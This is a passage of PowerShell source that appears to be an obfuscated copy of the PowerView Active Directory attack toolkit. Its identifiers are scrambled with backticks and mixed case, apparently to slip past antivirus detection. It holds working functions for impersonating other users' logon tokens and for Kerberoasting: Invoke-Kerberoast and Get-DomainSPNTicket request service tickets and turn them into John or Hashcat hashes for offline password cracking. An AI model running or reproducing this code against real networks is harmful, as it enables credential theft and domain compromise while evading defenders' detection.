        ${NET`Wo`RKcRe`d`Ent`IaL} = ${crEden`TI`AL}.GetNetworkCredential()
        ${UsERdoM`A`IN} = ${Ne`Two`RK`CRede`NTiAL}.Domain
        ${u`Se`R`NaMe} = ${n`ET`Wor`kcred`eNTiaL}.UserName
        wriT`e-wa`Rni`Ng "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        
        
        ${r`E`SuLt} = ${AdVap`I32}::LogonUser(${us`eRNa`mE}, ${uSE`R`doMAiN}, ${NeTw`O`RKcReDENTI`AL}.Password, 9, 3, [ref]${lOgo`NtoKE`N`HaN`DLE});${l`A`STERrOR} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not ${res`U`lT}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    
    ${R`esUlt} = ${AD`V`Api32}::ImpersonateLoggedOnUser(${l`oGO`NtOkeN`hA`NdLE})

    if (-not ${R`esU`Lt}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    WRite`-v`E`RBosE "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    ${lOGo`NTokENHa`ND`Le}
}


function iN`VoKE`-Reve`RTToSelF {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${tOkeNHA`N`d`lE}
    )

    if (${psBOUNDPa`Ram`eT`E`RS}['TokenHandle']) {
        Wri`Te-wa`R`Ni`NG "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        ${RES`Ult} = ${KE`R`Ne`l32}::CloseHandle(${tokEnh`A`ND`Le})
    }

    ${rESU`Lt} = ${aDv`AP`i32}::RevertToSelf();${lA`steR`ROr} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not ${r`ESULT}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    writE-Ve`R`BOsE "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}


function Get`-`D`OM`AInSpNTi`ckeT {


    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = ${tR`Ue}, ValueFromPipeline = ${t`RuE})]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        ${s`pN},

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = ${tR`Ue}, ValueFromPipeline = ${T`RuE})]
        [ValidateScript({ ${_}.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        ${Us`er},

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        ${oUtPu`T`Form`AT} = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`ed`eNTIAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${nU`lL} = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if (${pSbOu`NdPaR`AmE`TErS}['Credential']) {
            ${l`OgONT`o`ken} = Invo`ke`-`Us`e`RImper`s`oNatIoN -Credential ${C`RE`deNtIAL}
        }
    }

    PROCESS {
        if (${psBOu`N`dPa`RaM`eTeRS}['User']) {
            ${tAR`GET`Obj`ecT} = ${us`ER}
        }
        else {
            ${TA`RG`EtoB`JE`ct} = ${s`Pn}
        }

        ForEach (${ob`je`Ct} in ${T`A`R`gET`oBJEcT}) {
            if (${PS`BouNDpa`R`Am`eteRS}['User']) {
                ${USeRS`pN} = ${O`Bj`ECt}.ServicePrincipalName
                ${SAmACc`O`U`NTn`AME} = ${ObJ`EcT}.SamAccountName
                ${DI`sTIN`gu`IshED`NaMe} = ${ob`J`eCt}.DistinguishedName
            }
            else {
                ${USe`R`spN} = ${Obj`ECt}
                ${Sam`A`CCou`NtnAMe} = 'UNKNOWN'
                ${d`iSTI`Ng`U`iShEdNaME} = 'UNKNOWN'
            }

            
            if (${uSE`RsPn} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${uS`er`sPN} = ${u`sEr`sPn}[0]
            }

            try {
                ${tIc`KET} = new`-OB`J`Ect S`y`StE`M.IDEN`TitYmoDeL.tokeNs.KErB`Er`OsREqUESTO`R`sEC`Ur`itYtOKeN -ArgumentList ${us`ERsPN}
            }
            catch {
                wRIt`e`-`War`NiNg "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if (${TI`C`KEt}) {
                ${tiCk`Etb`YTEST`R`eAM} = ${T`iCKeT}.GetRequest()
            }
            if (${T`ick`Etb`YTe`stReAm}) {
                ${O`Ut} = NEW`-`oBJ`eCt ps`oBjE`CT

                ${TiCkET`he`xST`ReAM} = [System.BitConverter]::ToString(${tIC`Ketb`Y`TestReam}) -replace '-'

                ${o`UT} | adD-m`E`mB`er NoT`EprO`p`ErTY 'SamAccountName' ${s`Amac`co`UntnaME}
                ${o`UT} | aDd-M`EM`B`ER not`E`pRopErTy 'DistinguishedName' ${dI`s`Ti`NgUISh`EDN`AME}
                ${o`UT} | Add-m`E`m`BeR NOt`e`PRoPe`Rty 'ServicePrincipalName' ${T`i`cket}.ServicePrincipalName

                
                
                if(${t`IC`k`E`TheXstREam} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${eT`YPE} = [Convert]::ToByte( ${MAt`c`hEs}.EtypeLen, 16 )
                    ${cIP`h`Ert`ex`TLEn} = [Convert]::ToUInt32(${MA`TC`HeS}.CipherTextLen, 16)-4
                    ${CiphER`T`Ext} = ${m`A`TCHEs}.DataToEnd.Substring(0,${C`Ip`heRT`eXTleN}*2)

                    
                    if(${mAt`ChES}.DataToEnd.Substring(${cI`pher`TEXTLeN}*2, 4) -ne 'A482') {
                        WR`itE-waRn`I`NG "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        ${Ha`sh} = ${nu`Ll}
                        ${O`Ut} | a`dd-memB`er no`T`EPRO`PErtY 'TicketByteHexStream' ([Bitconverter]::ToString(${tIc`K`Et`BYTestreAm}).Replace('-',''))
                    } else {
                        ${HA`sh} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${o`UT} | aDD-`mEm`B`er NOTePRo`P`E`RtY 'TicketByteHexStream' ${n`ULL}
                    }
                } else {
                    Wri`TE-WA`Rn`i`NG "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    ${H`Ash} = ${n`ULL}
                    ${O`UT} | a`Dd`-mEmB`eR NOTep`R`O`PerTy 'TicketByteHexStream' ([Bitconverter]::ToString(${TiCKe`TBYtEStr`e`Am}).Replace('-',''))
                }

                if(${ha`sh}) {
                    
                    if (${OUtputFo`Rm`AT} -match 'John') {
                        ${HASh`FO`RMat} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${D`I`sTIng`UIsheDnA`ME} -ne 'UNKNOWN') {
                            ${uS`e`RDOmaIN} = ${DisTiN`gUI`ShE`DnA`ME}.SubString(${DisTin`GUIshedn`A`ME}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${USerD`OM`A`IN} = 'UNKNOWN'
                        }

                        
                        ${HA`SH`FORMAT} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${o`Ut} | ADD-Me`m`BEr nOteP`R`OP`eRtY 'Hash' ${HaSH`FoRM`AT}
                }

                ${O`Ut}.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                ${O`Ut}
            }
        }
    }

    END {
        if (${L`O`go`NtOkEn}) {
            Inv`okE-R`EvE`Rtto`S`elF -TokenHandle ${LO`gONto`KeN}
        }
    }
}


function In`Vo`ke-keRBEROa`St {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUe}, ValueFromPipelineByPropertyName = ${t`RuE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${I`denT`ity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOmA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LDA`P`FIlter},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEARC`hba`se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RVEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`eaRchsCo`pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`sUL`TpAgEsi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RVER`TIm`eLImit},

        [Switch]
        ${TOMBS`To`Ne},

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        ${OU`T`PuTfoRmAT} = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`D`E`NtiAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${u`S`Er`sEa`RcHERar`GUMEn`Ts} = @{
            'SPN' = ${T`RUe}
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if (${pSb`Ou`N`DpAramEteRs}['Domain']) { ${US`e`Rs`EArcHe`RarGu`MEn`TS}['Domain'] = ${dO`mA`in} }
        if (${Ps`B`Oundp`AraMEtERs}['LDAPFilter']) { ${US`ErSE`Ar`CheR`ARGumEntS}['LDAPFilter'] = ${Lda`pfI`LTER} }
        if (${p`sBoUndPA`R`Ame`Ters}['SearchBase']) { ${use`RS`E`Arc`HerAr`GumEnTS}['SearchBase'] = ${seaR`c`hBAse} }
        if (${psboU`NDParame`T`ers}['Server']) { ${u`sERSeaR`CHE`RaRg`UmenTS}['Server'] = ${seR`VER} }
        if (${pSbO`UnD`paRAmE`TeRS}['SearchScope']) { ${uS`ErSEARC`HErArG`U`meN`Ts}['SearchScope'] = ${Se`A`RChsCOPE} }
        if (${PS`B`OU`NDpA`RAmETeRS}['ResultPageSize']) { ${UserSE`ARCheRARgum`E`N`Ts}['ResultPageSize'] = ${ReSUL`Tp`AGeSIZE} }
        if (${psbo`UNd`Para`mETe`Rs}['ServerTimeLimit']) { ${u`S`erseAr`CH`EraR`Gu`mENtS}['ServerTimeLimit'] = ${s`e`RvErTImE`LImIT} }
        if (${pSb`OU`NDp`ArAmeTERS}['Tombstone']) { ${uSERs`e`ArCherArgU`Me`N`Ts}['Tombstone'] = ${t`Om`Bs`TOne} }
        if (${p`Sboun`DPaRa`meT`erS}['Credential']) { ${U`sERsEaR`ch`erA`RGuMEN`TS}['Credential'] = ${Cre`De`NTIAl} }

        if (${PsBOu`N`dPaRAmetE`Rs}['Credential']) {
            ${lO`GO`NtOKEN} = INVo`K`E`-uSeriM`pERS`O`NatION -Credential ${crE`DEn`Ti`AL}
        }
    }

    PROCESS {
        if (${PSb`O`Undp`Ara`metE`RS}['Identity']) { ${uSERsEarC`h`ErA`Rg`U`ME`Nts}['Identity'] = ${i`Den`Ti`TY} }
        gE`T-DoMAInu`sEr @UserSearcherArguments | WhEr`e`-o`BJeCT {${_}.samaccountname -ne 'krbtgt'} | Get-do`MaiN`SP`NTICk`ET -OutputFormat ${Ou`TPU`TF`OrmAt}
    }

    END {
        if (${lOGoN`To`KEn}) {
            InV`O`Ke-`ReVErTTO`Se`LF -TokenHandle ${log`ontO`kEN}
        }
    }
}


function gET-pAt`h`A`CL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${t`RUE}, ValueFromPipeline = ${t`RuE}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('FullName')]
        [String[]]
        ${PA`TH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`ent`iAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function c`ONvErT`-fIleR`iGhT {
            
            [CmdletBinding()]
            Param(
                [Int]
                ${F`Sr}
            )

            ${a`cCEssmA`SK} = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            ${si`mPL`ePer`m`iss`ioNS} = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            ${PErMis`si`ONs} = @()

            
            ${Pe`R`MiS`SiOnS} += ${SI`MpL`ePERMIsSI`oNS}.Keys | FOR`e`AcH-OBjE`ct {
                              if ((${F`sr} -band ${_}) -eq ${_}) {
                                ${siMp`Lepermi`SSIo`NS}[${_}]
                                ${F`sr} = ${f`sR} -band (-not ${_})
                              }
                            }

            
            ${pE`Rm`iSsIO`NS} += ${A`CCE`SsMask}.Keys | W`HERe-O`BJ`ECT { ${F`sr} -band ${_} } | f`OrEA`ch-`oBjECT { ${a`C`CEssmaSK}[${_}] }
            (${Perm`is`SIOnS} | wHER`E-Ob`Je`cT {${_}}) -join ','
        }

        ${cOnV`er`Targ`UM`E`NTS} = @{}
        if (${p`sBo`UndPaRa`MET`ErS}['Credential']) { ${CON`VeRtA`RGUmE`NTs}['Credential'] = ${cre`Den`TiAL} }

        ${M`APpE`DC`OMpuT`ErS} = @{}
    }

    PROCESS {
        ForEach (${TargEt`Pa`TH} in ${pa`TH}) {
            try {
                if ((${TArGEtp`A`TH} -Match '\\\\.*\\.*') -and (${PsB`OuNDparAME`TE`Rs}['Credential'])) {
                    ${HOStCo`m`PUtER} = (n`EW-objE`ct SyST`EM.`U`Ri(${taRg`etP`ATh})).Host
                    if (-not ${M`ApPEDCOMPu`Te`RS}[${Hos`T`C`ompuTEr}]) {
                        
                        AdD-`REmOteC`On`Ne`ctION -ComputerName ${hostCoM`p`UTEr} -Credential ${C`REdeNt`Ial}
                        ${maPp`EDcOmP`Ut`erS}[${h`O`STCoMp`U`TEr}] = ${t`Rue}
                    }
                }

                ${A`Cl} = gET`-`Acl -Path ${target`Pa`Th}

                ${A`cL}.GetAccessRules(${T`Rue}, ${t`RuE}, [System.Security.Principal.SecurityIdentifier]) | For`eACH-O`BJ`ecT {
                    ${s`ID} = ${_}.IdentityReference.Value
                    ${Na`ME} = cONverTfROm-`S`Id -ObjectSID ${S`iD} @ConvertArguments

                    ${o`Ut} = N`ew-`Object pSo`BjeCt
                    ${O`Ut} | AdD-`Me`MBEr NOTE`prOPEr`Ty 'Path' ${T`A`R`gETPaTh}
                    ${O`UT} | aDd-`MemB`er N`OteproP`e`RtY 'FileSystemRights' (Con`Vert`-fIlE`RIghT -FSR ${_}.FileSystemRights.value__)
                    ${o`Ut} | A`dD`-M`embER NO`TepROP`ErTY 'IdentityReference' ${Na`Me}
                    ${o`Ut} | Ad`D`-mE`MbER No`Te`prop`erTY 'IdentitySID' ${s`iD}
                    ${O`Ut} | aDD-`me`mbEr NotE`pRO`p`ERTy 'AccessControlType' ${_}.AccessControlType
                    ${O`UT}.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    ${O`Ut}
                }
            }
            catch {
                wR`itE-V`ER`B`oSe "[Get-PathAcl] error: $_"
            }
        }
    }

    END {
        
        ${Ma`pPeDCOM`PUTe`RS}.Keys | rEm`oVe-rEmoTe`COnN`eC`T`IoN
    }
}


function coNVE`Rt-lda`p`PRo`perTY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${tR`UE}, ValueFromPipeline = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        ${prO`peRti`eS}
    )

    ${o`BjECTpR`o`Per`TIeS} = @{}

    ${p`RopEr`TiEs}.keys | S`ort-OBJ`ecT | F`oREAC`H`-ObjECT {
        if (${_} -ne 'adspath') {
            if ((${_} -eq 'objectsid') -or (${_} -eq 'sidhistory')) {
                
                ${ObJE`CtprO`p`E`RtiEs}[${_}] = ${p`RoP`ERT`Ies}[${_}] | fOreach`-o`B`JecT { (n`eW-ObJ`EcT sySt`Em.S`E`curitY.pRINCI`pal.`S`e`Cur`It`YIde`Nt`i`F`iER(${_}, 0)).Value }
            }
            elseif (${_} -eq 'grouptype') {
                ${obJ`Ec`TPRo`p`er`TIeS}[${_}] = ${ProP`er`T`IeS}[${_}][0] -as ${grOu`ptyp`e`eNum}
            }
            elseif (${_} -eq 'samaccounttype') {
                ${oBj`ec`Tp`ROpE`R`Ties}[${_}] = ${P`Ro`P`eRTIEs}[${_}][0] -as ${sAMAC`cOUN`TTy`p`eEn`UM}
            }
            elseif (${_} -eq 'objectguid') {
                
                ${Ob`j`eCt`P`RO`PErTIEs}[${_}] = (NE`w-oBJ`ecT g`UID (,${P`R`opertieS}[${_}][0])).Guid
            }
            elseif (${_} -eq 'useraccountcontrol') {
                ${obJ`ecT`prOPEr`Ti`eS}[${_}] = ${p`Rop`ERTI`es}[${_}][0] -as ${uACEN`UM}
            }
            elseif (${_} -eq 'ntsecuritydescriptor') {
                
                ${D`EScRi`p`TOR} = N`Ew-o`BJ`ECT SE`Curity`.AcCessCONT`Rol.r`Aws`ECURitYD`E`ScriPtOr -ArgumentList ${pRo`pER`T`ies}[${_}][0], 0
                if (${dEs`CrI`pTOr}.Owner) {
                    ${Ob`jec`TPr`OPErtIEs}['OwnerSID'] = ${de`sCr`i`PtOR}.Owner
                    ${oWN`erob`JE`ct} = Get`-doma`iNo`BJe`CT ${Desc`Ri`PTOr}.Owner
                    ${ObJ`eCTPR`OPE`R`TI`es}['OwnerName'] = ${ow`NeR`oBj`EcT}.samaccountname
                }
                if (${dEscR`i`PtOR}.Group) {
                    ${oB`j`ecT`PrO`pERtI`es}['Group'] = ${dEs`CrI`p`TOR}.Group
                }
                if (${d`Es`C`RIPTOr}.DiscretionaryAcl) {
                    ${OBJE`ct`proPERt`IeS}['DiscretionaryAcl'] = ${D`ESCriPt`or}.DiscretionaryAcl
                }
                if (${DEsC`RiP`T`or}.SystemAcl) {
                    ${ObjEc`T`p`R`op`ERTIEs}['SystemAcl'] = ${dE`S`C`RiPToR}.SystemAcl
                }
            }
            elseif (${_} -eq 'accountexpires') {
                if (${PRoP`Erti`es}[${_}][0] -gt [DateTime]::MaxValue.Ticks) {
                    ${oBjECTPr`op`e`Rt`Ies}[${_}] = "NEVER"
                }
                else {
                    ${obj`ect`p`ROP`ERtI`eS}[${_}] = [datetime]::fromfiletime(${Pro`p`eRTi`Es}[${_}][0])
                }
            }
            elseif (${_} -eq 'lockouttime') {
                if (${P`R`O`PeRTIEs}[${_}][0] -eq 0 -or ${P`R`opE`RtIES}[${_}][0] -gt [DateTime]::MaxValue.Ticks) {
                    ${O`BJe`C`TpRop`ErTiES}[${_}] = "UNLOCKED"
                }
                else {
                    ${obj`e`cTp`Ro`PERties}[${_}] = [datetime]::fromfiletime(${pr`OP`E`RtieS}[${_}][0])
                }
            }
            elseif ( (${_} -eq 'lastlogon') -or (${_} -eq 'lastlogontimestamp') -or (${_} -eq 'pwdlastset') -or (${_} -eq 'lastlogoff') -or (${_} -eq 'badPasswordTime')  -or (${_} -eq 'ms-mcs-admpwdexpirationtime')) {
                
                if (${pROP`erTi`ES}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${tE`mP} = ${prop`ert`iEs}[${_}][0]
                    [Int32]${Hi`Gh} = ${T`eMP}.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, ${N`ULL}, ${Te`mp}, ${N`UlL})
                    [Int32]${l`OW}  = ${T`EMp}.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, ${n`Ull}, ${t`eMP}, ${n`ULl})
                    ${objeC`TP`RoPeR`T`iEs}[${_}] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f ${hi`gH}, ${l`oW})))
                }
                else {
                    
                    ${OBJ`EcTProPE`R`TieS}[${_}] = ([datetime]::FromFileTime((${PR`OpER`Ties}[${_}][0])))
                }
            }
            elseif (${_} -eq 'logonhours') {
                ${ObjeC`TPR`o`Per`TIeS}[${_}] = conVeR`T-l`OGOnHOU`Rs -LogonHours ${P`RoPe`R`TieS}[${_}][0]
            }
            elseif (${pr`opE`RTiEs}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${PR`OP} = ${Prope`R`T`iES}[${_}]
                try {
                    ${t`eMp} = ${pR`op}[${_}][0]
                    [Int32]${hi`gH} = ${t`EMp}.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, ${n`ULl}, ${t`eMP}, ${NU`lL})
                    [Int32]${l`oW}  = ${T`eMP}.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, ${Nu`lL}, ${te`mp}, ${nu`Ll})
                    ${o`BJE`cT`PROpert`IES}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${hi`gH}, ${L`ow})
                }
                catch {
                    w`RiTe`-VErBo`se "[Convert-LDAPProperty] error: $_"
                    ${O`BJectProP`er`TI`Es}[${_}] = ${pR`Op}[${_}]
                }
            }
            elseif (${p`R`OPEr`TIES}[${_}].count -eq 1) {
                ${O`BjECTpr`oPe`Rti`es}[${_}] = ${p`Rope`RTi`eS}[${_}][0]
            }
            else {
                ${oB`JE`C`TpRoPeRti`es}[${_}] = ${pROP`ERti`ES}[${_}]
            }
        }
    }
    try {
        N`e`w-oBject -TypeName p`SO`BjECT -Property ${o`Bj`ECTP`Ro`pERtiES}
    }
    catch {
        w`RiTe-w`Ar`NING "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}








function G`E`T-doMa`inseArCher {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`DaPFI`lTeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prOP`Er`TiEs},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sE`A`R`chbaSE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SEARCHBAS`eP`REf`Ix},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`erver},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Sea`RchS`cope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSUlT`P`AgEsi`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRv`Er`TI`m`ElIMit} = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SEc`UrI`TyM`As`Ks},

        [Switch]
        ${TOm`BST`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`E`DeNTIAL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${S`SL}
    )

    PROCESS {
        if (${p`s`BOUND`Pa`RAmE`TerS}['Domain']) {
            ${TaR`GeT`d`O`Main} = ${DO`maiN}

            if (${e`NV`:U`SERDnsDoMA`IN} -and (${ENV`:`USErDn`SdOM`AIn}.Trim() -ne '')) {
                
                ${US`Erd`O`MAiN} = ${e`Nv:U`S`er`dnSdOm`AIn}
                if (${ENv`:L`O`gOnsERVeR} -and (${En`V:`LOgONseRv`ER}.Trim() -ne '') -and ${US`e`RdOMAIN}) {
                    ${b`INDSe`R`VEr} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${P`sBOuN`DPArAme`T`ErS}['Credential']) {
            
            ${DO`m`AinOBjeCT} = g`Et`-d`OmaIn -Credential ${cRE`dEN`TIAL}
            ${BI`NDse`RVER} = (${doMaI`Nobj`ECt}.PdcRoleOwner).Name
            ${TaR`G`eTdom`A`IN} = ${d`o`MAiN`OBj`ect}.Name
        }
        elseif (${Env:U`seRDn`Sdo`mAIn} -and (${ENV:us`E`RD`Ns`dOmaIn}.Trim() -ne '')) {
            
            ${t`ArGE`TDO`M`Ain} = ${ENv:`UseR`D`NSdoMain}
            if (${env:lO`go`N`s`erV`eR} -and (${eNv:l`oGO`N`SeRVer}.Trim() -ne '') -and ${ta`RgeTd`OmA`IN}) {
                ${B`i`NDSERveR} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            wriT`e-veRBo`Se "get-domain"
            ${d`OmA`i`Nob`ject} = GEt-DO`M`Ain
            ${BiN`ds`erV`eR} = (${domAIn`o`B`jeCT}.PdcRoleOwner).Name
            ${TAR`GETDOm`A`In} = ${DOMa`I`NOb`Je`CT}.Name
        }

        if (${pSboUnDPa`RA`mEt`ers}['Server']) {
            
            ${bi`Nds`ERVer} = ${S`E`RvEr}
        }

        if (${pSbOunD`PaR`AmetE`RS}['SSL']) {
            if ([string]::IsNullOrEmpty(${binD`s`erVEr})) {
                ${DoMaI`N`ObjE`Ct} = g`eT-DO`m`Ain
                ${bI`NDser`Ver} = (${D`omainOB`JeCt}.PdcRoleOwner).Name
            }
            [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | OUT-`NU`LL
            WRiT`e-v`erbO`sE "[Get-DomainSearcher] Connecting to $($BindServer):636"
            ${S`eARCheR} = N`Ew`-obJECT -TypeName sy`sTEM`.d`ir`ectOrYsER`ViC`eS.PR`OToC`oLS.LDapcOn`Nec`TIOn -ArgumentList "$($BindServer):636"
            ${sE`Ar`chEr}.SessionOptions.SecureSocketLayer = ${T`RUe};
            ${SEArCH`eR}.SessionOptions.VerifyServerCertificate = { ${t`Rue} }
            ${S`Ea`RcHEr}.SessionOptions.DomainName = ${t`ArgeT`dO`M`Ain}
            ${se`ArCHER}.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
            if (${psb`ou`N`dPA`RAMETeRs}['Credential']) {
                ${SEa`RC`heR}.Bind(${C`Re`DentiAl})
            }
            else {
                ${s`e`ArCHER}.Bind()
            }
        }
        else {
            ${sE`ArcHstr`inG} = 'LDAP://'

            if (${B`inDs`eRv`eR} -and (${b`I`NDsErvER}.Trim() -ne '')) {
                ${seARCHs`T`RI`NG} += ${bi`ND`s`ERVer}
                if (${TA`RG`e`TdoMA`iN}) {
                    ${s`Ea`RCh`sTRiNg} += '/'
                }
            }

            if (${PSB`oUn`dp`ARAMETe`Rs}['SearchBasePrefix']) {
                ${s`E`ArcHS`TrIng} += ${SEaRChba`Se`Pre`FIx} + ','
            }

            if (${pSBOunDPaR`A`Me`T`ers}['SearchBase']) {
                if (${sE`Ar`Chb`AsE} -Match '^GC://') {
                    
                    ${D`N} = ${s`eARC`H`BaSE}.ToUpper().Trim('/')
                    ${S`eaR`cHS`TrI`Ng} = ''
                }
                else {
                    if (${S`EaRch`BaSE} -match '^LDAP://') {
                        if (${sE`ArCHb`Ase} -match "LDAP://.+/.+") {
                            ${SeArC`hsTRi`NG} = ''
                            ${Dn} = ${s`eArCHB`AsE}
                        }
                        else {
                            ${dn} = ${SE`A`RcH`BaSE}.SubString(7)
                        }
                    }
                    else {
                        ${Dn} = ${s`E`ARchbasE}
                    }
                }
            }
            else {
                
                if (${t`ARg`ETdOmAIn} -and (${T`ARg`etDo`MAiN}.Trim() -ne '')) {
                    ${d`N} = "DC=$($TargetDomain.Replace('.', ',DC='))"
                }
            }

            ${sear`cHSt`R`ING} += ${dN}
            w`RI`TE-VeRbosE "[Get-DomainSearcher] search base: $SearchString"

            if (${C`RE`DEntiAl} -ne [Management.Automation.PSCredential]::Empty) {
                wR`I`TE-veRBOse "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
                
